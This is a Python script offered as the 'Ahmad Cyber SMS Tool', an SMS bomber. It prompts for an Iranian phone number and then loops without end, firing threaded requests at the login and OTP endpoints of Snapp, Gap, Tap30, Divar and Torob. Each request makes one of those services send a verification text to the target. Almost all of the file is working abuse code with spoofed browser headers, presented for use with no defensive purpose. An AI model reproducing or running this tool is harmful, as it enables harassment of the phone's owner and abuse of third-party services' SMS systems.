from platform import node, system, release; Node, System, Release = node(), system(), release() 
from os import system, name; system('clear' if name == 'posix' else 'cls')
from re import match, sub
from time import sleep
from threading import Thread, active_count

try:
    import urllib3; urllib3.disable_warnings()
except ImportError:
    system("python3 -m pip install urllib3")
    sleep(1)
    system("clear")
    import urllib3; urllib3.disable_warnings()

try:
    from requests import get, post
except ImportError:
    system("python3 -m pip install requests")   

# ================================[BANNER]================================
print("\033[1;37m" + """
________/\\\\\\\\\________________/\\\_________________________________________________________________________________________________/\\\\\\\\\_____/\\\____________________________________________________/\\\____________         
 _____/\\\////////________________\/\\\_______________________________________________________________________________________________/\\\\\\\\\\\\\__\/\\\___________________________________________________\/\\\____________        
  ___/\\\/______________/\\\__/\\\_\/\\\________________________________________________________/\\\__________________________________/\\\/////////\\\_\/\\\___________________________________________________\/\\\____________       
   __/\\\_______________\//\\\/\\\__\/\\\____________/\\\\\\\\___/\\/\\\\\\\____________________\///___/\\/\\\\\\\____________________\/\\\_______\/\\\_\/\\\____________/\\\\\__/\\\\\____/\\\\\\\\\___________\/\\\____________      
    _\/\\\________________\//\\\\\___\/\\\\\\\\\____/\\\/////\\\_\/\\\/////\\\____________________/\\\_\/\\\/////\\\___________________\/\\\\\\\\\\\\\\\_\/\\\\\\\\\\___/\\\///\\\\\///\\\_\////////\\\_____/\\\\\\\\\____________     
     _\//\\\________________\//\\\____\/\\\////\\\__/\\\\\\\\\\\__\/\\\___\///____________________\/\\\_\/\\\___\///____________________\/\\\/////////\\\_\/\\\/////\\\_\/\\\_\//\\\__\/\\\___/\\\\\\\\\\___/\\\////\\\____________    
      __\///\\\___________/\\_/\\\_____\/\\\__\/\\\_\//\\///////___\/\\\___________________________\/\\\_\/\\\___________________________\/\\\_______\/\\\_\/\\\___\/\\\_\/\\\__\/\\\__\/\\\__/\\\/////\\\__\/\\\__\/\\\____________   
       ____\////\\\\\\\\\_\//\\\\/______\/\\\\\\\\\___\//\\\\\\\\\\_\/\\\__________/\\\\\\\\\\\\\\\_\/\\\_\/\\\__________/\\\\\\\\\\\\\\\_\/\\\_______\/\\\_\/\\\___\/\\\_\/\\\__\/\\\__\/\\\_\//\\\\\\\\/\\_\//\\\\\\\/\\___________  
        _______\/////////___\////________\/////////_____\//////////__\///__________\///////////////__\///__\///__________\///////////////__\///________\///__\///____\///__\///___\///___\///___\////////\//___\///////\//____________ 
""" + "\033[0m")

print("\033[1;36m" + " " * 45 + "https://github.com/Ahmad-Cyber-prince" + "\033[0m")
print()

# ================================[SERVICES FUNCTIONS]================================

def snap(phone):
    snapH = {
        "Host": "app.snapp.taxi", 
        "content-length": "29", 
        "x-app-name": "passenger-pwa", 
        "x-app-version": "5.0.0", 
        "app-version": "pwa", 
        "user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36", 
        "content-type": "application/json", 
        "accept": "*/*", 
        "origin": "https://app.snapp.taxi", 
        "sec-fetch-site": "same-origin", 
        "sec-fetch-mode": "cors", 
        "sec-fetch-dest": "empty", 
        "referer": "https://app.snapp.taxi/login/?redirect_to\u003d%2F", 
        "accept-encoding": "gzip, deflate, br", 
        "accept-language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6", 
        "cookie": "_gat\u003d1"
    }
    snapD = {"cellphone": phone}
    
    try:
        snapR = post(timeout=5, url="https://app.snapp.taxi/api/api-passenger-oauth/v2/otp", headers=snapH, json=snapD).text
        if "OK" in snapR:
            print(f'{g}(Snap) {w}Code Was Sent')
            return True
    except: pass

def gap(phone):
    gapH = {
        "Host": "core.gap.im",
        "accept": "application/json, text/plain, */*",
        "x-version": "4.5.7",
        "accept-language": "fa",
        "user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36",
        "appversion": "web",
        "origin": "https://web.gap.im",
        "sec-fetch-site": "same-site",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://web.gap.im/",
        "accept-encoding": "gzip, deflate, br"
    }
    
    try:
        gapR = get(timeout=5, url="https://core.gap.im/v1/user/add.json?mobile=%2B{}".format(phone.split("+")[1]), headers=gapH).text
        if "OK" in gapR:
            print(f'{g}(Gap) {w}Code Was Sent')
            return True
    except: pass

def tap30(phone):
    tap30H = {
        "Host": "tap33.me",
        "Connection": "keep-alive",
        "Content-Length": "63",
        "User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36",
        "content-type": "application/json",
        "Accept": "*/*",
        "Origin": "https://app.tapsi.cab",
        "Sec-Fetch-Site": "cross-site",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://app.tapsi.cab/",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6"
    }
    tap30D = {"credential": {"phoneNumber": "0"+phone.split("+98")[1], "role": "PASSENGER"}}
    
    try:
        tap30R = post(timeout=5, url="https://tap33.me/api/v2/user", headers=tap30H, json=tap30D).json()
        if tap30R['result'] == "OK":
            print(f'{g}(Tap30) {w}Code Was Sent')
            return True
    except: pass

def divar(phone):
    divarH = {
        'accept': 'application/json, text/plain, */*',
        'accept-encoding': 'gzip, deflate, br',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://divar.ir',
        'referer': 'https://divar.ir/',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36',
        'x-standard-divar-error': 'true'
    }
    divarD = {"phone": phone.split("+98")[1]}
    
    try:
        divarR = post(timeout=5, url="https://api.divar.ir/v5/auth/authenticate", headers=divarH, json=divarD).json()
        if divarR["authenticate_response"] == "AUTHENTICATION_VERIFICATION_CODE_SENT":
            print(f'{g}(Divar) {w}Code Was Sent')
            return True
    except: pass

def torob(phone):
    phone = '0'+phone.split('+98')[1]
    torobH = {
        'accept': '*/*',
        'accept-encoding': 'gzip, deflate, br',
        'accept-language': 'en-US,en;q=0.9',
        'cookie': 'abtest=next_pwa; search_session=ofwjiyqqethomevqrgzxvopjtgkgimdc; _gcl_au=1.1.805505755.1639260830; _gid=GA1.2.683761449.1639260830; _gat_UA-105982196-1=1; _ga_CF4KGKM3PG=GS1.1.1639260830.1.0.1639260830.0; _clck=130ifw1|1|ex6|0; _ga=GA1.2.30224238.1639260830',
        'origin': 'https://torob.com',
        'referer': 'https://torob.com/',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36'
    }
    
    try:
        torobR = get(timeout=5, url=f"https://api.torob.com/a/phone/send-pin/?phone_number={phone}", headers=torobH).json()
        if torobR["message"] == "pin code sent":
            print(f'{g}(Torob) {w}Code Was Sent')
            return True
    except: pass

# ================================[UTILITY FUNCTIONS]================================

def is_phone(phone: str):
    phone = sub("\s+", "" ,phone.strip())
    if match(r"^\+989[0-9]{9}$", phone):
        return phone
    elif match(r"^989[0-9]{9}$", phone):
        return f"+{phone}"
    elif match(r"^09[0-9]{9}$", phone):
        return f"+98{phone[1::]}"
    elif match(r"^9[0-9]{9}$", phone):
        return f"+98{phone}"
    else:
        return False

def printLow(Str):
    for char in Str:
        print(char, end='', flush=True)
        sleep(.01)

def start(x: int, S: str):
    if active_count() < x:
        exec(S)

r='\033[1;31m'
g='\033[32;1m' 
y='\033[1;33m'
w='\033[1;37m'

printLow(f'{r}Ahmad Cyber SMS Tool\n\n{y}Info:\n    {g}[+] {y}Developer: {w}Ahmad Cyber\n    {g}[+] {y}GitHub: {w}Ahmad-Cyber-prince\n   \n{y}system:\n    {g}[+] {y}Platform: {w}{System}\n    {g}[+] {y}Node: {w}{Node}\n    {g}[+] {y}Release: {w}{Release}\n\n')

def Vip(phone, Time):
    Thread(target=snap, args=[phone]).start(), sleep(Time)
    Thread(target=gap, args=[phone]).start(), sleep(Time)
    Thread(target=tap30, args=[phone]).start(), sleep(Time)
    Thread(target=divar, args=[phone]).start(), sleep(Time)
    Thread(target=torob, args=[phone]).start(), sleep(Time)

while True:
    phone = is_phone(input(f'{g}[?] {y}Enter Phone Number {g}(+98) {r}- {w}'))
    if phone:
        break
    else:
        print(f'{r}[!] Invalid phone number format!')

try:
    Time = float(input(f'{g}[?] {y}Enter Sleep Time Between Requests {g}[Defult=0.1] {r}- {w}'))
except ValueError:
    Time = 0.1
    print(f"{g}[0.1] {w}Used")

while True:
    try: Vip(phone, Time)
    except KeyboardInterrupt: exit(f'{r}[-] User Exited')
    except: print(f'{r}[-] Error TimeOut')
